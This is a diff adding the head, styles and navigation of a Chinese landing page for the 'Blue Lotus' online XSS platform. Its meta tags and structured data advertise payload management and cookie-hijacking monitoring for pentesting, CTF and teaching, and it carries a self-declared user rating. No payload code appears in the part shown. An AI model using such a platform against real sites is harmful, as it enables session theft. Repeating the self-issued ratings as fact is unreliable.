@@ -1,0 +1,2362 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="tu/xssicon.png">
+    <link rel="shortcut icon" type="image/png" href="tu/xssicon.png">
+    <link rel="apple-touch-icon" href="tu/xssicon.png">
+    
+    <!-- SEO基础标签 -->
+    <title>蓝莲花在线XSS平台 - 领先的免费跨站渗透测试脚本在线系统</title>
+    <meta name="description" content="蓝莲花XSS在线平台是全球领先的免费xss在线平台，提供XSS漏洞检测、跨站脚本测试、Payload管理等功能。100%开源免费，支持实时日志分析、智能模板库，适用于渗透测试、CTF竞赛和安全教学，助力网络安全研究人员快速发现XSS漏洞。">
+    <meta name="keywords" content="在线XSS平台,XSS测试,跨站脚本,XSS漏洞检测,XSS平台,XSS系统源码,蓝莲花XSS在线平台">
+    <meta name="author" content="黑客仓库">
+    <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+    <meta name="googlebot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+    <meta name="baiduspider" content="index, follow">
+    <link rel="canonical" href="https://hackapt.com/">
+    
+    <!-- 额外SEO优化标签 -->
+    <meta name="rating" content="general">
+    <meta name="revisit-after" content="7 days">
+    <meta name="distribution" content="global">
+    <meta name="language" content="zh-CN">
+    <meta name="coverage" content="Worldwide">
+    <meta name="target" content="all">
+    <meta name="audience" content="xss在线平台,xss跨站脚本攻击平台,蓝莲花xss在线平台">
+    <meta name="classification" content="Security Tools, Web Security, XSS Testing Platform">
+    <meta name="subject" content="XSS漏洞检测与Web安全测试平台">
+    <meta name="copyright" content="黑客仓库">
+    <meta name="generator" content="蓝莲花XSS在线平台 v2.0">
+    
+    <!-- Open Graph / Facebook 社交媒体分享优化 -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://hackapt.com/">
+    <meta property="og:title" content="蓝莲花XSS在线平台 - 专业Web安全测试工具">
+    <meta property="og:description" content="免费开源的XSS漏洞检测平台，支持实时监控、Payload管理、日志分析。适用于渗透测试、CTF竞赛和安全教学，让Web安全测试更简单高效。">
+    <meta property="og:site_name" content="蓝莲花XSS在线平台">
+    <meta property="og:locale" content="zh_CN">
+    <meta property="og:image" content="https://hackapt.com/tu/1.png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:image:alt" content="蓝莲花XSS在线平台界面截图">
+    
+    <!-- Twitter 卡片优化 -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:url" content="https://hackapt.com/">
+    <meta name="twitter:title" content="蓝莲花XSS在线平台 - 专业Web安全测试工具">
+    <meta name="twitter:description" content="免费开源的XSS漏洞检测平台，支持实时监控、Payload管理、日志分析。让Web安全测试更简单高效。">
+    <meta name="twitter:image" content="https://hackapt.com/tu/1.png">
+    <meta name="twitter:image:alt" content="蓝莲花XSS在线平台">
+    <meta name="twitter:site" content="@BlueLotusSec">
+    <meta name="twitter:creator" content="@BlueLotusSec">
+    
+    <!-- 移动端优化 -->
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    
+    <!-- DNS预解析 -->
+    <link rel="dns-prefetch" href="//cdn.jsdelivr.net">
+    <link rel="dns-prefetch" href="//cdnjs.cloudflare.com">
+    
+    <!-- 结构化数据 - JSON-LD 增强版 -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "SoftwareApplication",
+      "name": "蓝莲花XSS在线平台",
+      "alternateName": "Blue Lotus XSS Platform",
+      "applicationCategory": "SecurityApplication",
+      "applicationSubCategory": "Web安全测试工具",
+      "operatingSystem": "Web Browser, Cross-platform",
+      "offers": {
+        "@type": "Offer",
+        "price": "0",
+        "priceCurrency": "CNY",
+        "availability": "https://schema.org/InStock",
+        "priceValidUntil": "2030-12-31"
+      },
+      "description": "蓝莲花XSS在线平台是一款完全免费开源的Web安全测试工具，专注于XSS漏洞检测与跨站脚本测试。提供实时日志监控、智能Payload管理、模板库系统等专业功能，支持反射型、存储型、DOM型XSS检测。适用于渗透测试、CTF竞赛、安全教学和漏洞研究。",
+      "url": "https://hackapt.com",
+      "image": "https://hackapt.com/tu/1.png",
+      "screenshot": "https://hackapt.com/tu/1.png",
+      "datePublished": "2024-01-01",
+      "dateModified": "2025-11-22",
+      "version": "2.0.8",
+      "softwareVersion": "2.0.8",
+      "inLanguage": "zh-CN",
+      "license": "https://opensource.org/licenses/MIT",
+      "creator": {
+        "@type": "Organization",
+        "name": "黑客仓库",
+        "alternateName": "Blue Lotus Security Team",
+        "url": "https://hackapt.com",
+        "logo": "https://hackapt.com/tu/1.png",
+        "sameAs": [
+          "https://github.com/bluelotus",
+          "https://twitter.com/BlueLotusSec"
+        ]
+      },
+      "aggregateRating": {
+        "@type": "AggregateRating",
+        "ratingValue": "4.8",
+        "ratingCount": "856",
+        "bestRating": "5",
+        "worstRating": "1"
+      },
+      "featureList": [
+        "实时XSS漏洞检测",
+        "智能Payload管理",
+        "详细日志分析",
+        "XSS模板库系统",
+        "安全配置管理",
+        "高性能架构",
+        "反射型XSS检测",
+        "存储型XSS检测",
+        "DOM型XSS检测",
+        "Cookie劫持监控",
+        "支持CTF竞赛",
+        "Docker一键部署",
+        "完全开源免费",
+        "私有化部署"
+      ],
+      "softwareRequirements": "Web Browser (Chrome, Firefox, Safari, Edge)",
+      "releaseNotes": "v2.0.8 最新版本：新增数据库升级管理、政府网站过滤、Payload安全限制、伪静态支持、SEO优化等功能"
+    }
+    </script>
+    
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "WebSite",
+      "name": "蓝莲花XSS在线平台",
+      "alternateName": "Blue Lotus XSS Platform",
+      "url": "https://hackapt.com",
+      "description": "专业的XSS漏洞检测与Web安全测试平台",
+      "inLanguage": "zh-CN",
+      "publisher": {
+        "@type": "Organization",
+        "name": "黑客仓库",
+        "logo": {
+          "@type": "ImageObject",
+          "url": "https://hackapt.com/tu/1.png"
+        }
+      },
+      "potentialAction": {
+        "@type": "SearchAction",
+        "target": {
+          "@type": "EntryPoint",
+          "urlTemplate": "https://hackapt.com/search?q={search_term_string}"
+        },
+        "query-input": "required name=search_term_string"
+      }
+    }
+    </script>
+    
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Organization",
+      "name": "黑客仓库",
+      "alternateName": "Blue Lotus Security Team",
+      "url": "https://hackapt.com",
+      "logo": "https://hackapt.com/tu/1.png",
+      "description": "专注于Web安全研究与工具开发的专业安全团队",
+      "sameAs": [
+        "https://github.com/bluelotus",
+        "https://twitter.com/BlueLotusSec",
+        "https://t.me/hackhub7"
+      ],
+      "contactPoint": {
+        "@type": "ContactPoint",
+        "contactType": "技术支持",
+        "url": "https://hackhub.org/contact-us.html",
+        "availableLanguage": ["zh-CN", "en"]
+      }
+    }
+    </script>
+    
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "FAQPage",
+      "mainEntity": [
+        {
+          "@type": "Question",
+          "name": "蓝莲花XSS平台是什么？",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "蓝莲花XSS在线平台是一款完全免费开源的Web安全测试工具，专门用于XSS漏洞检测和跨站脚本测试。支持反射型、存储型、DOM型XSS检测，提供实时日志监控、Payload管理等专业功能。"
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "蓝莲花XSS平台支持哪些功能？",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "平台支持实时XSS检测、智能Payload管理、详细日志分析、XSS模板库、安全配置管理等功能。可用于渗透测试、CTF竞赛、安全教学和漏洞研究。"
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "如何部署蓝莲花XSS平台？",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "平台支持Docker一键部署，也可以使用宝塔面板等传统方式部署。完全开源免费，支持私有化部署，5分钟即可启动您的XSS测试平台。"
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "蓝莲花XSS平台是否免费？",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "是的，蓝莲花XSS平台完全免费开源，无任何隐藏费用。所有代码开源，支持私有化部署，数据完全掌控在自己手中。"
+          }
+        }
+      ]
+    }
+    </script>
+    
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "首页",
+          "item": "https://hackapt.com/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "XSS平台",
+          "item": "https://hackapt.com/"
+        }
+      ]
+    }
+    </script>
+    <link href="static/libs/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="static/libs/fontawesome/css/all.min.css">
+    <!-- CDN 备用图标库 -->
+    <link rel="stylesheet" href="static/libs/fontawesome/css/all.min.css" crossorigin="anonymous">
+    <link rel="stylesheet" href="static/css/style.css">
+    
+    <style>
+        /* 悬浮导航栏样式 */
+        .floating-nav {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 9998;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .nav-btn {
+            background: linear-gradient(135deg, rgba(0, 255, 65, 0.15), rgba(0, 255, 65, 0.05));
+            border: 2px solid var(--neon-green);
+            color: var(--neon-green);
+            padding: 10px 20px;
+            border-radius: var(--border-radius);
+            font-size: 0.9rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .nav-btn::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(0, 255, 65, 0.3);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+        }
+        
+        .nav-btn:hover::before {
+            width: 200px;
+            height: 200px;
+        }
+        
+        .nav-btn:hover {
+            background: rgba(0, 255, 65, 0.25);
+            box-shadow: 0 0 25px rgba(0, 255, 65, 0.5);
+            transform: translateY(-2px);
+        }
+        
+        .nav-btn i,
+        .nav-btn span {
+            position: relative;
+            z-index: 1;
+        }
+        
+        /* 语言切换按钮 */
+        .lang-switch {
+            background: linear-gradient(135deg, rgba(0, 212, 255, 0.15), rgba(0, 212, 255, 0.05));
+            border: 2px solid var(--accent-blue);
+            color: var(--accent-blue);
+            min-width: 50px;
+            padding: 10px 15px;
+            justify-content: center;
+        }
+        
+        .lang-switch:hover {
+            background: rgba(0, 212, 255, 0.25);
+            box-shadow: 0 0 25px rgba(0, 212, 255, 0.5);
+        }
+        
+        .lang-switch::before {
+            background: rgba(0, 212, 255, 0.3);
+        }
+        
+        /* 功能库按钮特殊样式 */
+        .wiki-btn {
+            background: linear-gradient(135deg, rgba(255, 170, 0, 0.1), rgba(255, 170, 0, 0.03));
+            border-color: rgba(255, 170, 0, 0.4);
+            color: rgba(255, 170, 0, 0.7);
+        }
+        
+        .wiki-btn:hover {
+            background: rgba(255, 170, 0, 0.15);
+            box-shadow: 0 0 20px rgba(255, 170, 0, 0.3);
+        }
+        
+        .wiki-btn::before {
+            background: rgba(255, 170, 0, 0.2);
+        }
+        
+        /* Payload测试按钮特殊样式 */
+        .nav-btn:first-child {
+            background: linear-gradient(135deg, rgba(255, 170, 0, 0.1), rgba(255, 170, 0, 0.03));
+            border-color: rgba(255, 170, 0, 0.4);
+            color: rgba(255, 170, 0, 0.7);
+        }
+        
+        .nav-btn:first-child:hover {
+            background: rgba(255, 170, 0, 0.15);
+            box-shadow: 0 0 20px rgba(255, 170, 0, 0.3);
+        }
+        
+        .nav-btn:first-child::before {
+            background: rgba(255, 170, 0, 0.2);
+        }
+        
+        /* 技术服务按钮特殊样式 */
+        .service-btn {
+            background: linear-gradient(135deg, rgba(255, 170, 0, 0.1), rgba(255, 170, 0, 0.03));
+            border-color: rgba(255, 170, 0, 0.4);
+            color: rgba(255, 170, 0, 0.7);
+        }
+        
+        .service-btn:hover {
+            background: rgba(255, 170, 0, 0.15);
+            box-shadow: 0 0 20px rgba(255, 170, 0, 0.3);
+        }
+        
+        .service-btn::before {
+            background: rgba(255, 170, 0, 0.2);
+        }
+        
+        /* 登录注册按钮特殊样式 - 更加突出 */
+        .nav-btn:nth-child(4) {
+            background: linear-gradient(135deg, rgba(0, 255, 65, 0.25), rgba(0, 255, 65, 0.15));
+            border-color: var(--neon-green);
+            color: var(--neon-green);
+            border-width: 2.5px;
+            font-weight: 700;
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.4);
+        }
+        
+        .nav-btn:nth-child(4):hover {
+            background: rgba(0, 255, 65, 0.35);
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.6);
+        }
+        
+        .nav-btn:nth-child(4)::before {
+            background: rgba(0, 255, 65, 0.4);
+        }
+        
+        /* 移动端适配 */
+        @media (max-width: 768px) {
+            .floating-nav {
+                top: 15px;
+                right: 15px;
+                gap: 10px;
+            }
+            
+            .nav-btn {
+                padding: 8px 15px;
+                font-size: 0.85rem;
+            }
+            
+            .nav-btn span.btn-text {
+                display: none;
+            }
+            
+            .lang-switch {
+                min-width: 45px;
+                padding: 8px 12px;
+            }
+        }
+        
+        /* 首页专属样式 */
+        .hero-section {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .hero-content {
+            text-align: center;
+            z-index: 10;
+            padding: 2rem;
+        }
+        
+        .hero-title {
+            font-size: 4rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            background: linear-gradient(45deg, #00ff41, #00ffff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+        
+        @keyframes glow {
+            from { text-shadow: 0 0 20px rgba(0, 255, 65, 0.5), 0 0 40px rgba(0, 255, 65, 0.3); }
+            to { text-shadow: 0 0 30px rgba(0, 255, 65, 0.8), 0 0 60px rgba(0, 255, 65, 0.5); }
+        }
+        
+        .hero-subtitle {
+            font-size: 1.5rem;
+            color: var(--text-secondary);
+            margin-bottom: 2rem;
+        }
+        
+        .terminal-demo {
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid var(--neon-green);
+            border-radius: var(--border-radius);
+            padding: 1.5rem;
+            font-family: var(--font-family);
+            font-size: 0.9rem;
+            color: var(--neon-green);
+            text-align: left;
+            max-width: 600px;
+            margin: 0 auto 2rem;
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.3);
+            position: relative;
+        }
+        
+        .terminal-header {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 1px solid rgba(0, 255, 65, 0.3);
+        }
+        
+        .terminal-btn {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+        
+        .terminal-btn.red { background: #ff5f56; }
+        .terminal-btn.yellow { background: #ffbd2e; }
+        .terminal-btn.green { background: #27c93f; }
+        
+        .typing-text {
+            white-space: pre-wrap;
+            line-height: 1.6;
+        }
+        
+        .cursor {
+            display: inline-block;
+            width: 10px;
+            height: 18px;
+            background: var(--neon-green);
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0; }
+        }
+        
+        .feature-card {
+            background: linear-gradient(135deg, var(--bg-secondary) 0%, var(--bg-tertiary) 100%);
+            border: 1px solid var(--border-color);
+            padding: 2rem;
+            border-radius: var(--border-radius);
+            transition: all 0.3s ease;
+            height: 100%;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .feature-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 255, 65, 0.1), transparent);
+            transition: left 0.5s ease;
+        }
+        
+        .feature-card:hover::before {
+            left: 100%;
+        }
+        
+        .feature-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 10px 40px rgba(0, 255, 65, 0.2);
+            border-color: var(--neon-green);
+        }
+        
+        .feature-icon {
+            font-size: 3rem;
+            color: var(--neon-green);
+            margin-bottom: 1rem;
+            display: inline-block;
+            animation: float 3s ease-in-out infinite;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .section-title {
+            font-size: 2.5rem;
+            text-align: center;
+            margin-bottom: 3rem;
+            color: var(--text-highlight);
+            position: relative;
+        }
+        
+        .section-title::after {
+            content: '';
+            display: block;
+            width: 100px;
+            height: 3px;
+            background: var(--neon-green);
+            margin: 1rem auto 0;
+            box-shadow: 0 0 10px var(--neon-green);
+        }
+        
+        .code-example {
+            background: rgba(0, 0, 0, 0.5);
+            border-left: 3px solid var(--neon-green);
+            padding: 1rem;
+            margin: 1rem 0;
+            font-family: var(--font-family);
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .code-line {
+            opacity: 0;
+            animation: slideIn 0.5s ease forwards;
+        }
+        
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+        
+        .stats-counter {
+            text-align: center;
+            padding: 2rem;
+        }
+        
+        .counter-value {
+            font-size: 3rem;
+            font-weight: 700;
+            color: var(--neon-green);
+            font-family: var(--font-family);
+        }
+        
+        .counter-label {
+            font-size: 1rem;
+            color: var(--text-secondary);
+            margin-top: 0.5rem;
+        }
+        
+        .cta-button {
+            padding: 1rem 3rem;
+            font-size: 1.2rem;
+            background: linear-gradient(45deg, rgba(0, 255, 65, 0.2), rgba(0, 255, 65, 0.1));
+            border: 2px solid var(--neon-green);
+            color: var(--neon-green);
+            border-radius: var(--border-radius);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            backdrop-filter: blur(10px);
+        }
+        
+        .cta-button::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(0, 255, 65, 0.3);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+        }
+        
+        .cta-button:hover::before {
+            width: 300px;
+            height: 300px;
+        }
+        
+        .cta-button:hover {
+            background: rgba(0, 255, 65, 0.3);
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.5);
+            transform: scale(1.05);
+        }
+        
+        .cta-button span {
+            position: relative;
+            z-index: 1;
+        }
+        
+        .floating-particles {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            pointer-events: none;
+        }
+        
+        .particle {
+            position: absolute;
+            width: 3px;
+            height: 3px;
+            background: var(--neon-green);
+            border-radius: 50%;
+            animation: rise 15s infinite ease-in;
+        }
+        
+        @keyframes rise {
+            0% {
+                bottom: -10px;
+                opacity: 0;
+            }
+            10% {
+                opacity: 1;
+            }
+            90% {
+                opacity: 1;
+            }
+            100% {
+                bottom: 100%;
+                opacity: 0;
+            }
+        }
+        
+        /* 向下滚动指示器 */
+        .scroll-indicator {
+            position: absolute;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 100;
+            text-align: center;
+            cursor: pointer;
+            animation: bounce 2s infinite;
+        }
+        
+        .scroll-indicator .mouse {
+            width: 30px;
+            height: 50px;
+            border: 2px solid var(--neon-green);
+            border-radius: 15px;
+            display: flex;
+            justify-content: center;
+            padding-top: 10px;
+            margin: 0 auto 10px;
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
+        }
+        
+        .scroll-indicator .mouse .wheel {
+            width: 4px;
+            height: 10px;
+            background: var(--neon-green);
+            border-radius: 2px;
+            animation: scroll-wheel 1.5s infinite;
+        }
+        
+        @keyframes scroll-wheel {
+            0% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+            100% {
+                opacity: 0;
+                transform: translateY(15px);
+            }
+        }
+        
+        .scroll-indicator .text {
+            color: var(--neon-green);
+            font-size: 0.9rem;
+            font-family: var(--font-family);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+        
+        .scroll-indicator .arrow {
+            font-size: 1.5rem;
+            color: var(--neon-green);
+            animation: arrow-bounce 1s infinite;
+        }
+        
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% {
+                transform: translateX(-50%) translateY(0);
+            }
+            40% {
+                transform: translateX(-50%) translateY(-10px);
+            }
+            60% {
+                transform: translateX(-50%) translateY(-5px);
+            }
+        }
+        
+        @keyframes arrow-bounce {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(5px);
+            }
+        }
+        
+        /* SVG插图容器 */
+        .illustration-box {
+            background: rgba(10, 10, 10, 0.8);
+            border: 2px solid var(--neon-green);
+            border-radius: 15px;
+            padding: 30px;
+            margin: 2rem 0;
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.2);
+            backdrop-filter: blur(10px);
+        }
+        
+        .illustration-title {
+            text-align: center;
+            color: var(--neon-green);
+            margin-bottom: 20px;
+            font-size: 1.3rem;
+            font-weight: bold;
+        }
+        
+        /* 右下角浮动按钮 */
+        .floating-actions {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        
+        .float-btn {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            border: 2px solid;
+            backdrop-filter: blur(10px);
+        }
+        
+        .telegram-btn {
+            background: rgba(0, 136, 204, 0.3);
+            border-color: #0088cc;
+            color: #0088cc;
+        }
+        
+        .telegram-btn:hover {
+            background: rgba(0, 136, 204, 0.5);
+            box-shadow: 0 6px 25px rgba(0, 136, 204, 0.6);
+            transform: scale(1.1);
+        }
+        
+        .back-to-top {
+            background: linear-gradient(135deg, rgba(0, 255, 65, 0.2), rgba(0, 255, 65, 0.1));
+            border-color: var(--neon-green);
+            color: var(--neon-green);
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+        
+        .back-to-top.show {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .back-to-top:hover {
+            background: rgba(0, 255, 65, 0.3);
+            box-shadow: 0 6px 25px rgba(0, 255, 65, 0.4);
+            transform: scale(1.1);
+        }
+        
+        .float-btn i {
+            font-size: 1.3rem;
+        }
+        
+        @media (max-width: 768px) {
+            .floating-actions {
+                bottom: 20px;
+                right: 20px;
+            }
+            .float-btn {
+                width: 45px;
+                height: 45px;
+            }
+            
+            /* 移动端按钮布局修复 */
+            .hero-content .mb-4 {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                gap: 15px;
+            }
+            
+            .cta-button {
+                margin: 0 !important;
+                width: 100%;
+                max-width: 280px;
+                padding: 0.8rem 2rem;
+                font-size: 1rem;
+            }
+            
+            .hero-title {
+                font-size: 2.5rem;
+            }
+            
+            .hero-subtitle {
+                font-size: 1.2rem;
+            }
+        }
+        
+        /* 图片展示板块样式 */
+        .gallery-item {
+            position: relative;
+            overflow: hidden;
+            border-radius: var(--border-radius);
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            transition: all 0.3s ease;
+        }
+        
+        .gallery-item:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 8px 25px rgba(0, 255, 65, 0.3);
+        }
+        
+        .gallery-image {
+            width: 100%;
+            height: 250px; /* 固定高度 */
+            object-fit: cover; /* 保持图片比例，裁剪填充 */
+            display: block;
+            transition: all 0.5s ease;
+            border-radius: var(--border-radius);
+        }
+        
+        .gallery-item:hover .gallery-image {
+            transform: scale(1.1);
+            filter: brightness(0.6);
+        }
+        
+        .gallery-overlay {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: linear-gradient(to top, rgba(0, 0, 0, 0.9) 0%, rgba(0, 0, 0, 0.7) 50%, transparent 100%);
+            opacity: 0;
+            transition: all 0.4s ease;
+            display: flex;
+            align-items: flex-end;
+            justify-content: center;
+            padding: 2rem;
+            height: 100%;
+            pointer-events: none; /* 让遮罩层不阻挡点击事件 */
+        }
+        
+        .gallery-item:hover .gallery-overlay {
+            opacity: 1;
+        }
+        
+        .overlay-content {
+            text-align: center;
+            color: var(--neon-green);
+            transform: translateY(20px);
+            transition: transform 0.4s ease;
+        }
+        
+        .gallery-item:hover .overlay-content {
+            transform: translateY(0);
+        }
+        
+        .overlay-content i {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+            display: block;
+        }
+        
+        .overlay-content p {
+            font-size: 1.2rem;
+            font-weight: 600;
+            margin: 0;
+            text-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
+        }
+        
+        @media (max-width: 768px) {
+            .gallery-overlay {
+                opacity: 1;
+                background: linear-gradient(to top, rgba(0, 0, 0, 0.85) 0%, rgba(0, 0, 0, 0.5) 40%, transparent 100%);
+            }
+            
+            .overlay-content {
+                transform: translateY(0);
+            }
+            
+            .overlay-content i {
+                font-size: 2rem;
+            }
+            
+            .overlay-content p {
+                font-size: 1rem;
+            }
+        }
+        
+        /* 灯箱样式 */
+        .lightbox {
+            display: none;
+            position: fixed;
+            z-index: 9999;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.95);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            animation: fadeIn 0.3s ease;
+        }
+        
+        .lightbox.active {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .lightbox-content {
+            position: relative;
+            max-width: 90%;
+            max-height: 90%;
+            animation: zoomIn 0.3s ease;
+        }
+        
+        @keyframes zoomIn {
+            from {
+                transform: scale(0.7);
+                opacity: 0;
+            }
+            to {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+        
+        #lightbox-img {
+            max-width: 100%;
+            max-height: 85vh;
+            width: auto;
+            height: auto;
+            display: block;
+            border-radius: var(--border-radius);
+            box-shadow: 0 0 50px rgba(0, 255, 65, 0.3);
+            border: 2px solid rgba(0, 255, 65, 0.5);
+        }
+        
+        .lightbox-caption {
+            text-align: center;
+            color: var(--neon-green);
+            font-size: 1.2rem;
+            margin-top: 1rem;
+            text-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
+            font-weight: 600;
+        }
+        
+        .lightbox-close {
+            position: absolute;
+            top: 20px;
+            right: 40px;
+            color: var(--neon-green);
+            font-size: 50px;
+            font-weight: bold;
+            cursor: pointer;
+            z-index: 10000;
+            transition: all 0.3s ease;
+            text-shadow: 0 0 20px rgba(0, 255, 65, 0.8);
+        }
+        
+        .lightbox-close:hover {
+            color: #fff;
+            transform: rotate(90deg) scale(1.2);
+            text-shadow: 0 0 30px rgba(0, 255, 65, 1);
+        }
+        
+        .lightbox-prev,
+        .lightbox-next {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            background: rgba(0, 255, 65, 0.2);
+            border: 2px solid var(--neon-green);
+            color: var(--neon-green);
+            font-size: 30px;
+            padding: 15px 20px;
+            cursor: pointer;
+            border-radius: var(--border-radius);
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+        }
+        
+        .lightbox-prev:hover,
+        .lightbox-next:hover {
+            background: rgba(0, 255, 65, 0.4);
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.6);
+            transform: translateY(-50%) scale(1.1);
+        }
+        
+        .lightbox-prev {
+            left: 30px;
+        }
+        
+        .lightbox-next {
+            right: 30px;
+        }
+        
+        @media (max-width: 768px) {
+            .lightbox-close {
+                top: 10px;
+                right: 20px;
+                font-size: 35px;
+            }
+            
+            .lightbox-prev,
+            .lightbox-next {
+                font-size: 20px;
+                padding: 10px 15px;
+            }
+            
+            .lightbox-prev {
+                left: 10px;
+            }
+            
+            .lightbox-next {
+                right: 10px;
+            }
+            
+            .lightbox-caption {
+                font-size: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- 悬浮导航栏 -->
+    <nav class="floating-nav">
+        <button class="nav-btn" onclick="window.location.href='payload-test.php'" title="Payload测试">
+            <i class="fas fa-flask"></i>
+            <span class="btn-text">Payload测试</span>
+        </button>
+        <button class="nav-btn wiki-btn" onclick="window.location.href='wiki.html'" title="XSS知识库">
+            <i class="fas fa-book"></i>
+            <span class="btn-text">XSS知识库</span>
+        </button>
+        <button class="nav-btn service-btn" onclick="window.open('https://hackhub.org/contact-us.html', '_blank')" title="技术服务">
+            <i class="fas fa-user-secret"></i>
+            <span class="btn-text">技术服务</span>
+        </button>
+        <button class="nav-btn" onclick="window.location.href='login.php'" title="登录注册">
+            <i class="fas fa-sign-in-alt"></i>
+            <span class="btn-text">登录注册</span>
+        </button>
+        <button class="nav-btn lang-switch" onclick="toggleLanguage()" title="切换语言">
+            <span id="lang-text">EN</span>
+        </button>
+    </nav>
+    
+    <!-- 浮动粒子背景 -->
+    <div class="floating-particles" id="particles"></div>
+    
